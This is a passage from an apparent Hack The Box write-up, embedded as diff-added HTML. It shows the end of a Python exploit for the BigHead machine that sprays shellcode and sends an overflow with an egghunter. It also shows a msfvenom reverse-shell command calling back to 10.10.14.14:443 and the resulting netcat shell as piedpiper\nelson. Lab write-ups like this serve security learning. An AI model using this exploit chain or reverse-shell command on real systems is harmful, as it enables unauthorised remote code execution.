+</span> <span class="mi">68</span>     <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">spray_payload</span><span class="p">)</span>
+ <span class="mi">69</span>     <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+ <span class="mi">70</span>     <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+ <span class="mi">71</span>     <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+ <span class="mi">72</span> 
+ <span class="mi">73</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Payload sent.</span><span class="se">\n</span><span class="s">[*] Sleeping 1 second.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">74</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+ <span class="mi">75</span> 
+ <span class="mi">76</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Sending overflow + egghunter.</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">77</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Expect callback in 0-15 minutes to %s:%s.</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">cb_ip</span><span class="p">,</span> <span class="n">cb_port</span><span class="p">))</span>
+ <span class="mi">78</span> <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+ <span class="mi">79</span> <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">exec_payload</span><span class="p">)</span>
+ <span class="mi">80</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+ <span class="mi">81</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+ <span class="mi">82</span> <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Comments:</p>
+<ul>
+<li>Lines 15-48 are just about generating the shellcode and cleaning up.</li>
+<li>Lines 50-73 set up the upcoming web requests.</li>
+<li>Lines 65-72 send the POST with the shell 5 times</li>
+<li>Lines 77-83 send the HEAD with the egg hunter payload.</li>
+</ul>
+<p>In hindsight, I didn’t really use the <code class="language-plaintext highlighter-rouge">pwntools</code> stuff, and I wish I had just built it with <code class="language-plaintext highlighter-rouge">requests</code>.</p>
+<p>But, it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>python pwn_bighead.py dev.bighead.htb 80 10.10.14.14 443
+<span class="go">[*] Generating shellcode:
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXIT_FUNC=THREAD -a x86 --platform windows -b "\x00\x0a\x0d" -f python -v shellcode -o sc.py
+[+] Shellcode generated successfully
+[*] Sending payload 5 times
+[+] Opening connection to dev.bighead.htb on port 80: Done
+[*] Closed connection to dev.bighead.htb port 80
+[+] Opening connection to dev.bighead.htb on port 80: Done
+[*] Closed connection to dev.bighead.htb port 80
+[+] Opening connection to dev.bighead.htb on port 80: Done
+[*] Closed connection to dev.bighead.htb port 80
+[+] Opening connection to dev.bighead.htb on port 80: Done
+[*] Closed connection to dev.bighead.htb port 80
+[+] Opening connection to dev.bighead.htb on port 80: Done
+[*] Closed connection to dev.bighead.htb port 80
+[+] Payload sent.
+[*] Sleeping 1 second.
+[*] Sending overflow + egghunter.
+[*] Expect callback in 0-15 minutes to 10.10.14.14:443.
+[+] Opening connection to dev.bighead.htb on port 80: Done
+</span></code></pre></div></div>
+<p>A few minutes later:</p>
+<div class="language-console rlwrap-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>rlwrap nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.112.
+Ncat: Connection from 10.10.10.112:49200.
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+</span><span class="gp">C:\nginx&gt;</span><span class="nb">whoami</span>
+<span class="go">piedpiper\nelson
+</span></code></pre></div></div>
+<div class="PageNavigation">
+<a class="prev" href="/2019/05/04/htb-bighead.html">« BigHead Walkthrough</a></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2019/05/04/htb-bighead-bof.html"></a>
+</article>
